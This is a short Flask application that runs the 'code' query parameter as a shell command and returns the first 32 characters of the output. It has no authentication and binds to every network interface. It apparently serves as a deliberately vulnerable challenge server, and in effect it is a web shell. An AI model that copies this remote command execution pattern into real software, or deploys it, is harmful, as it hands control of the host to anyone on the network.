from flask import Flask, request
from subprocess import PIPE, Popen

app = Flask(__name__)

def exec(q):
    p = Popen(q, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = p.communicate()
    if stdout:
        return stdout.decode()
    return stderr.decode()

@app.route('/')
def execute():
    code = request.args.get('code')
    if request.args.get('code') is None:
        return "No code provided"
    if code != "":
        out = exec(code)
        out = out[:32]
        return out
    return "No code provided"

app.run(host='0.0.0.0', port=8009)